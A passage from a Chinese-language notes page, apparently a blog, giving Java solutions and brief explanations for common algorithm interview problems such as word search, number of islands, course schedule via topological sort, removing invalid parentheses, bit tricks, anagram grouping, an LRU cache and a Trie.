class="keyword">if</span>(target - candidates[index] &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">        track.add(candidates[index]);</span><br><span class="line">        backtrack(candidates, target - candidates[index], track, index);</span><br><span class="line">        track.remove(track.size() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-6-单词搜索"><a href="#7-6-单词搜索" class="headerlink" title="7.6 单词搜索"></a>7.6 单词搜索</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">exist</span><span class="params">(<span class="keyword">char</span>[][] board, String word)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; board.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dfs(board, word, <span class="number">0</span>, i, j))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>  <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">dfs</span><span class="params">(<span class="keyword">char</span>[][] board, String word, <span class="keyword">int</span> index, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(index == word.length())&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(i &gt;= board.length || i &lt; <span class="number">0</span> || j &gt;= board[<span class="number">0</span>].length </span><br><span class="line">    || j &lt; <span class="number">0</span>|| board[i][j] != word.charAt(index))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(board[i][j] == word.charAt(index))&#123;</span><br><span class="line">        <span class="keyword">char</span> tmp = board[i][j];</span><br><span class="line">        <span class="comment">//选择</span></span><br><span class="line">        board[i][j] = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">        <span class="comment">//递归</span></span><br><span class="line">        <span class="keyword">if</span>(dfs(board, word, index + <span class="number">1</span>, i + <span class="number">1</span>, j) || dfs(board, word, index + <span class="number">1</span>, i - <span class="number">1</span>, j)</span><br><span class="line">        || dfs(board, word, index + <span class="number">1</span>, i, j + <span class="number">1</span>) ||  dfs(board, word, index + <span class="number">1</span>, i, j - <span class="number">1</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        board[i][j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-7-岛屿数量"><a href="#7-7-岛屿数量" class="headerlink" title="7.7 岛屿数量"></a>7.7 岛屿数量</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numIslands</span><span class="params">(<span class="keyword">char</span>[][] grid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m = grid.length, n = grid[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dfs(grid, i, j))&#123;</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">dfs</span><span class="params">(<span class="keyword">char</span>[][] grid, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; <span class="number">0</span> || i &gt;= grid.length || j &lt; <span class="number">0</span> || j &gt;= grid[<span class="number">0</span>].length || grid[i][j] == <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    grid[i][j] = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">    dfs(grid, i + <span class="number">1</span>, j);</span><br><span class="line">    dfs(grid, i - <span class="number">1</span>, j);</span><br><span class="line">    dfs(grid, i, j + <span class="number">1</span>);</span><br><span class="line">    dfs(grid, i, j - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-8-课程表"><a href="#7-8-课程表" class="headerlink" title="7.8 课程表"></a>7.8 课程表</h2><p>我们可以将深度优先搜索的流程与拓扑排序的求解联系起来，用一个栈来存储所有已经搜索完成的节点。</p><p>对于一个节点 u，如果它的所有相邻节点都已经搜索完成，那么在搜索回溯到 u 的时候，u 本身也会变成一个已经搜索完成的节点。这里的「相邻节点」指的是从 u 出发通过一条有向边可以到达的所有节点。</p><p>假设我们当前搜索到了节点 u，如果它的所有相邻节点都已经搜索完成，那么这些节点都已经在栈中了，此时我们就可以把 u 入栈。可以发现，如果我们从栈顶往栈底的顺序看，由于 u 处于栈顶的位置，那么 u 出现在所有 u 的相邻节点的前面。因此对于 u 这个节点而言，它是满足拓扑排序的要求的。</p><p>这样以来，我们对图进行一遍深度优先搜索。当每个节点进行回溯的时候，我们把该节点放入栈中。最终从栈顶到栈底的序列就是一种拓扑排序。</p><p>算法</p><p>对于图中的任意一个节点，它在搜索的过程中有三种状态，即：</p><ul><li>「未搜索」：我们还没有搜索到这个节点；</li><li>「搜索中」：我们搜索过这个节点，但还没有回溯到该节点，即该节点还没有入栈，还有相邻的节点没有搜索完成）；</li><li>「已完成」：我们搜索过并且回溯过这个节点，即该节点已经入栈，并且所有该节点的相邻节点都出现在栈的更底部的位置，满足拓扑排序的要求。</li></ul><p>通过上述的三种状态，我们就可以给出使用深度优先搜索得到拓扑排序的算法流程，在每一轮的搜索搜索开始时，我们任取一个「未搜索」的节点开始进行深度优先搜索。</p><p>我们将当前搜索的节点 u 标记为「搜索中」，遍历该节点的每一个相邻节点 v：</p><p>如果 v为「未搜索」，那么我们开始搜索 v，待搜索完成回溯到 u；</p><p>如果 v 为「搜索中」，那么我们就找到了图中的一个环，因此是不存在拓扑排序的；</p><p>如果 v 为「已完成」，那么说明 v 已经在栈中了，而 u 还不在栈中，因此 u 无论何时入栈都不会影响到 (u,v) 之前的拓扑关系，以及不用进行任何操作。</p><p>当 u 的所有相邻节点都为「已完成」时，我们将 u 放入栈中，并将其标记为「已完成」。</p><p>在整个深度优先搜索的过程结束后，如果我们没有找到图中的环，那么栈中存储这所有的 n 个节点，从栈顶到栈底的顺序即为一种拓扑排序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">//edges是邻接表</span></span><br><span class="line">List&lt;List&lt;Integer&gt;&gt; edges;</span><br><span class="line">   <span class="keyword">int</span>[] visited;</span><br><span class="line">   <span class="keyword">boolean</span> valid = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">canFinish</span><span class="params">(<span class="keyword">int</span> numCourses, <span class="keyword">int</span>[][] prerequisites)</span> </span>&#123;</span><br><span class="line">       edges = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numCourses; i++)&#123;</span><br><span class="line">           edges.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;());</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> num[] : prerequisites)&#123;</span><br><span class="line">           edges.get(num[<span class="number">1</span>]).add(num[<span class="number">0</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">       visited = <span class="keyword">new</span> <span class="keyword">int</span>[numCourses];</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numCourses &amp;&amp; valid; i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(visited[i] == <span class="number">0</span>)&#123;</span><br><span class="line">               dfs(i);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> valid;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">       visited[k] = <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i : edges.get(k))&#123;</span><br><span class="line">           <span class="keyword">if</span>(visited[i] == <span class="number">0</span>)&#123;</span><br><span class="line">               dfs(i);</span><br><span class="line">               <span class="keyword">if</span>(!valid)&#123;</span><br><span class="line">                   <span class="keyword">return</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;<span class="keyword">else</span> <span class="keyword">if</span>(visited[i] == <span class="number">1</span>)&#123;</span><br><span class="line">               valid = <span class="keyword">false</span>;</span><br><span class="line">               <span class="keyword">return</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       visited[k] = <span class="number">2</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="7-9-删除无效括号"><a href="#7-9-删除无效括号" class="headerlink" title="7.9 删除无效括号"></a>7.9 删除无效括号</h2><p>先遍历计算出需要删除得左括号和右括号个数，再递归尝试可能得结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">char</span>[] charArray;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;String&gt; validExpressions = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">removeInvalidParentheses</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.len = s.length();</span><br><span class="line">        <span class="keyword">this</span>.charArray = s.toCharArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第 1 步：遍历一次，计算多余的左右括号</span></span><br><span class="line">        <span class="keyword">int</span> leftRemove = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> rightRemove = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (charArray[i] == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                leftRemove++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (charArray[i] == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// 遇到右括号的时候，须要根据已经存在的左括号数量决定</span></span><br><span class="line">                <span class="keyword">if</span> (leftRemove == <span class="number">0</span>) &#123;</span><br><span class="line">                    rightRemove++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (leftRemove &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// 关键：一个右括号出现可以抵销之前遇到的左括号</span></span><br><span class="line">                    leftRemove--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第 2 步：回溯算法，尝试每一种可能的删除操作</span></span><br><span class="line">        StringBuilder path = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        dfs(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, leftRemove, rightRemove, path);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;&gt;(<span class="keyword">this</span>.validExpressions);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> index       当前遍历到的下标</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> leftCount   已经遍历到的左括号的个数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> rightCount  已经遍历到的右括号的个数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> leftRemove  最少应该删除的左括号的个数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> rightRemove 最少应该删除的右括号的个数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> path        一个可能的结果</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> index, <span class="keyword">int</span> leftCount, <span class="keyword">int</span> rightCount, <span class="keyword">int</span> leftRemove, <span class="keyword">int</span> rightRemove, StringBuilder path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (index == len) &#123;</span><br><span class="line">            <span class="keyword">if</span> (leftRemove == <span class="number">0</span> &amp;&amp; rightRemove == <span class="number">0</span>) &#123;</span><br><span class="line">                validExpressions.add(path.toString());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> character = charArray[index];</span><br><span class="line">        <span class="comment">// 可能的操作 1：删除当前遍历到的字符</span></span><br><span class="line">        <span class="keyword">if</span> (character == <span class="string">&#x27;(&#x27;</span> &amp;&amp; leftRemove &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 由于 leftRemove &gt; 0，并且当前遇到的是左括号，因此可以尝试删除当前遇到的左括号</span></span><br><span class="line">            dfs(index + <span class="number">1</span>, leftCount, rightCount, leftRemove - <span class="number">1</span>, rightRemove, path);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (character == <span class="string">&#x27;)&#x27;</span> &amp;&amp; rightRemove &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 由于 rightRemove &gt; 0，并且当前遇到的是右括号，因此可以尝试删除当前遇到的右括号</span></span><br><span class="line">            dfs(index + <span class="number">1</span>, leftCount, rightCount, leftRemove, rightRemove - <span class="number">1</span>, path);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 可能的操作 2：保留当前遍历到的字符</span></span><br><span class="line">        <span class="comment">// 做选择</span></span><br><span class="line">        path.append(character);</span><br><span class="line">        <span class="comment">//递归</span></span><br><span class="line">        <span class="keyword">if</span> (character != <span class="string">&#x27;(&#x27;</span> &amp;&amp; character != <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果不是括号，继续深度优先遍历</span></span><br><span class="line">            dfs(index + <span class="number">1</span>, leftCount, rightCount, leftRemove, rightRemove, path);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (character == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 考虑左括号</span></span><br><span class="line">            dfs(index + <span class="number">1</span>, leftCount + <span class="number">1</span>, rightCount, leftRemove, rightRemove, path);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rightCount &lt; leftCount) &#123;</span><br><span class="line">            <span class="comment">// 考虑右括号</span></span><br><span class="line">            dfs(index + <span class="number">1</span>, leftCount, rightCount + <span class="number">1</span>, leftRemove, rightRemove, path);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//撤销选择</span></span><br><span class="line">        path.deleteCharAt(path.length() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="8-位运算"><a href="#8-位运算" class="headerlink" title="8. 位运算"></a>8. 位运算</h1><h2 id="8-1-只出现一次的数字"><a href="#8-1-只出现一次的数字" class="headerlink" title="8.1 只出现一次的数字"></a>8.1 只出现一次的数字</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">        res ^= num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-2-汉明距离"><a href="#8-2-汉明距离" class="headerlink" title="8.2 汉明距离"></a>8.2 汉明距离</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingDistance</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> z = x ^ y;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(z != <span class="number">0</span>)&#123;</span><br><span class="line">        z = z &amp; (z - <span class="number">1</span>);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="9-字符串"><a href="#9-字符串" class="headerlink" title="9. 字符串"></a>9. 字符串</h1><h2 id="9-1-字母异位词分组"><a href="#9-1-字母异位词分组" class="headerlink" title="9.1 字母异位词分组"></a>9.1 字母异位词分组</h2><p>ArrayList构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ArrayList(Collection&lt;? extends E&gt; c)</span><br><span class="line">构造一个包含指定 collection 的元素的列表，这些元素是按照该 collection 的迭代器返回它们的顺序排列的。</span><br></pre></td></tr></table></figure><p>HashMap values方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Collection&lt;V&gt; <span class="title">values</span><span class="params">()</span></span></span><br><span class="line"><span class="function">返回此映射所包含的值的 Collection 视图。</span></span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; groupAnagrams(String[] strs) &#123;</span><br><span class="line">    HashMap&lt;String, List&lt;String&gt;&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span>(String str : strs)&#123;</span><br><span class="line">        <span class="keyword">char</span>[] array = str.toCharArray();</span><br><span class="line">        Arrays.sort(array);</span><br><span class="line">        String key = <span class="keyword">new</span> String(array);</span><br><span class="line">        List&lt;String&gt; list = map.getOrDefault(key, <span class="keyword">new</span> LinkedList&lt;String&gt;());</span><br><span class="line">        list.add(str);</span><br><span class="line">        map.put(key, list);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;List&lt;String&gt;&gt;(map.values());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="10-设计"><a href="#10-设计" class="headerlink" title="10. 设计"></a>10. 设计</h1><h2 id="10-1-LRU缓存机制"><a href="#10-1-LRU缓存机制" class="headerlink" title="10.1 LRU缓存机制"></a>10.1 LRU缓存机制</h2><p>LRU算法的实现依赖于LinkedListHashMap的结构，要明白为什么使用LinkedHashMap。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> cap;</span><br><span class="line">LinkedHashMap&lt;Integer, Integer&gt; cache = <span class="keyword">new</span> LinkedHashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">LRUCache</span><span class="params">(<span class="keyword">int</span> capacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.cap = capacity;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!cache.containsKey(key)) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将 key 变为最近使用</span></span><br><span class="line">    makeRecently(key);</span><br><span class="line">    <span class="keyword">return</span> cache.get(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">put</span><span class="params">(<span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(cache.containsKey(key))&#123;</span><br><span class="line">        cache.put(key, value);</span><br><span class="line">        makeRecently(key);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cache.size() &gt;= <span class="keyword">this</span>.cap)&#123;</span><br><span class="line">        <span class="comment">//删除最久未使用元素</span></span><br><span class="line">        <span class="keyword">int</span> oldKey = cache.keySet().iterator().next();</span><br><span class="line">        cache.remove(oldKey);</span><br><span class="line">    &#125;</span><br><span class="line">    cache.put(key, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">makeRecently</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value = cache.get(key);</span><br><span class="line">    cache.remove(key);</span><br><span class="line">    cache.put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-2-实现Tire-前缀树"><a href="#10-2-实现Tire-前缀树" class="headerlink" title="10.2 实现Tire(前缀树)"></a>10.2 实现Tire(前缀树)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Trie</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> isEnd = <span class="keyword">false</span>;</span><br><span class="line">    Trie[] next = <span class="keyword">new</span> Trie[<span class="number">26</span>];</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Initialize your data structure here. */</span></span><br><span 